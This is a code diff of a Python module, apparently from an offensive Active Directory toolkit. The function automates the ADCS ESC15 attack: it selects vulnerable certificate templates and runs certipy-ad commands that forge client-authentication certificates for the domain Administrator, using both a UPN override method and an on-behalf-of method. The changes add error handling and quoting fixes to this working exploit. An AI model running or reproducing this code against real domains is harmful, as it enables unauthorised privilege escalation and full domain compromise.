@@ -1,12 +1,20 @@
 import os
 from core.helpers import run_command, save_loot, load_json_loot
 from core.colors import blue, green, red, yellow
+from core.helpers import select_from_list
 
 def abuse_esc15(session):
     print(blue("[>] ESC15: Abusing misconfigured certificate templates that allow specifying Application Policies (e.g., ClientAuth)."))
     print(yellow("[*] This attack forges a client-auth certificate for Administrator via misused templates."))
 
-    ca_name = session.adcs_metadata['cas'][0]['name']
+    cas = session.adcs_metadata.get("cas", [])
+    if not cas:
+        print(red("[-] No CA found in session metadata. Run 'adcs enum' again."))
+        return
+
+    ca_name = cas[0]["name"]
+    print(blue(f"[*] Using CA: {ca_name}"))
+
     dc_ip = session.dc_ip
     username = session.username
     domain = session.domain
@@ -20,13 +28,13 @@ def abuse_esc15(session):
         print(red("[-] No credentials provided (password or hash)."))
         return
 
-    templates = session.adcs_metadata['cas'][0].get("templates") or load_json_loot(session, template_fallback=True)
+    # === Fix: Get templates from top-level key
+    templates = session.adcs_metadata.get("templates") or load_json_loot(session, template_fallback=True)
     if not templates:
         print(red("[-] No templates available. Run 'adcs enum' first."))
         return
 
     esc15_templates = [tpl for tpl in templates if "ESC15" in tpl.get("vulns", [])]
-
     if not esc15_templates:
         print(red("[-] No ESC15 vulnerable templates detected. Ensure ADCS enum was run properly."))
         return
@@ -48,7 +56,7 @@ def abuse_esc15(session):
     print(blue("[*] Method 1: Request certificate with UPN override and Client Authentication policy"))
     method1_cmd = (
         f"certipy-ad req -dc-ip {dc_ip} -ca '{ca_name}' -target-ip {dc_ip} "
-        f"{auth} -template {template} "
+        f"{auth} -template '{template}' "
         f"-upn {upn} -application-policies 'Client Authentication' -out {output_file}"
     )
 
@@ -67,7 +75,7 @@ def abuse_esc15(session):
     intermed_pfx = "cert_admin_esc15_method2.pfx"
     method2_stage1 = (
         f"certipy-ad req {auth} -application-policies \"1.3.6.1.4.1.311.20.2.1\" "
-        f"-ca {ca_name} -template {template} -dc-ip {dc_ip} -out {intermed_pfx}"
+        f"-ca '{ca_name}' -template '{template}' -dc-ip {dc_ip} -out {intermed_pfx}"
     )
 
     print(blue("[*] Requesting intermediate certificate with custom OID..."))
@@ -80,7 +88,7 @@ def abuse_esc15(session):
 
     method2_stage2 = (
         f"certipy-ad req {auth} -on-behalf-of {domain}\\Administrator "
-        f"-template User -ca {ca_name} -pfx {intermed_pfx} -dc-ip {dc_ip} -out administrator_esc15_method2.pfx"
+        f"-template User -ca '{ca_name}' -pfx {intermed_pfx} -dc-ip {dc_ip} -out administrator_esc15_method2.pfx"
     )
 
     print(blue("[*] Requesting certificate on behalf of Administrator..."))
